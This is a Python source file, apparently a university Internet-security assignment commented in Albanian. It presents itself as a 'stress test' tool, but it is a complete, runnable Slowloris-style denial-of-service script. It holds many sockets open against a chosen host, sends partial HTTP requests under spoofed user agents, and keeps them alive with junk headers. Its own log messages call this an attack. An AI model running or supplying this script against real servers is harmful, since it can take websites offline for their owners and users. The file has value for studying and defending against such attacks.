# /************************************************\
# |       AUTORI:  Agon Hoxha,  140704110004       |
# |  LENDA: Siguria ne Internet,  VITI: 2018/2019  |
# |  DETYRA:  Zhvillim i aplikacionit qe mundeson  |
# |  stress testing te nje sajti te caktuar,   #6  |
# \************************************************/

#importimet e duhura
import argparse
import logging
import random
import socket
import ssl
import sys
import time

#mundesimi i perfshirjes te argumenteve ne komanden python ISSulm.py
parser = argparse.ArgumentParser(description="IS Stresser - stress test tool i thjeshte.", add_help=False)
parser.add_argument('host', nargs="?", help="Caku qe do e stresojme.")
parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Shfaq kete pamje me instruksione.')
parser.add_argument('-p', '--port', default=80, help="Porti i cakut (default 80).", type=int)
parser.add_argument('-s', '--sockets', default=100, help="Numri i sockets qe do perdoret per test (default 100).", type=int)
parser.add_argument('-d', '--detaje', dest="verbose", action="store_true", help="Shfaq informata shtese gjate ekzekutimit (verbose).")
parser.add_argument('-r', '--random-ua', dest="randuseragent", action="store_true", help="Perdor user-agent te rastesishem.")
parser.add_argument('-q', '--qete', dest="quiet", action="store_true", help="Nuk shfaq asgje gjate ekzekutimit.")
parser.add_argument("--https", dest="https", action="store_true", help="Perdor HTTPS per requests.")

#Marrja e vlerave default
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(https=False)
parser.set_defaults(quiet=False)

#Leximi i user input
args = parser.parse_args()

#handling gabime te mundshme ne user input
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit()

#percaktimi i logging mode
if args.verbose and args.quiet:
    print("Mund te perdorni vetem -d ose vetem -q!")
    sys.exit()
else:
    if args.verbose:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
    elif args.quiet:
        logging.basicConfig(level=logging.CRITICAL)
    else:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

list_of_sockets = []

#list e user_agents qe mund te perdoren
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

logging.info("\nAutori: Agon Hoxha \nVersioni: 0.94 \nPerfunduar: 15/01/2019")

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Gjejm perdorim per mesimet nga Rrjeta Kompjuterike
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)
    
    #krijojme socket, fillojme lidhjen
    s.connect((ip, args.port))

    #bejme attach user_agent te zgjedhur dhe dergojme paketen
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Sulmojme %s me %s socket.", ip, socket_count)
    logging.info("Krijojme socketet...")
    for _ in range(socket_count):
        try:
            logging.debug("Krijojme socket nr %s", _)
            s = init_socket(ip)
        except socket.error:
            logging.info("Problem me rrjetin.")
            break
        list_of_sockets.append(s)
    while True:
        try:
            logging.info("Dergojme keep-alive headers. Numri i sockets: %s", len(list_of_sockets))
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s) 
                    #nese nje socket nuk funksionon me, per qfaredo arsye, e largojme

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Rikrijojme socketet.")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    logging.info("Probleme me rrjetin.")
                    break
            time.sleep(15)
        
        #handling veprimin ctrl+c te userit
        except (KeyboardInterrupt, SystemExit):
            logging.info("Sulmi eshte ndalur.")
            break

if __name__ == "__main__":
    main()
